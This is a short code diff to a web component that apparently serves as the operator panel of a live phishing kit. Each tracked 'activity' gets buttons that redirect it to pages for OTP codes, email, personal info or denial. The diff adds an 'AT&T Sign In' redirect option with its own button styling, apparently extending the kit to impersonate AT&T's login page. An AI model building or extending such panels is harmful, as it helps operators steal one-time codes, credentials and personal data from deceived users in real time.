@@ -135,6 +135,7 @@ export default function LinkPage() {
             <button class="redirect-btn otp" data-action="redirect" data-redirect="otp">OTP Code Page</button>
             <button class="redirect-btn email" data-action="redirect" data-redirect="email">Email Page</button>
             <button class="redirect-btn personal" data-action="redirect" data-redirect="personal">Personal Info Page</button>
+            <button class="redirect-btn att" data-action="redirect" data-redirect="att">AT&T Sign In</button>
             <button class="deny-btn" data-action="deny">Deny</button>
           </div>
           <div class="activity-status status-pending" id="status-${activity.id}">Waiting for redirect...</div>
@@ -145,6 +146,7 @@ export default function LinkPage() {
             <button class="redirect-btn otp" data-action="redirect" data-redirect="otp">OTP Code Page</button>
             <button class="redirect-btn email" data-action="redirect" data-redirect="email">Email Page</button>
             <button class="redirect-btn personal" data-action="redirect" data-redirect="personal">Personal Info Page</button>
+            <button class="redirect-btn att" data-action="redirect" data-redirect="att">AT&T Sign In</button>
             <button class="deny-btn" data-action="deny">Deny</button>
           </div>
           <div class="activity-status status-pending" id="status-${activity.id}">Waiting for redirect...</div>
@@ -439,6 +441,11 @@ export default function LinkPage() {
 
         .redirect-btn.personal {
           background: #ff6b00;
+          color: white;
+        }
+
+        .redirect-btn.att {
+          background: #00a8e0;
           color: white;
         }
 
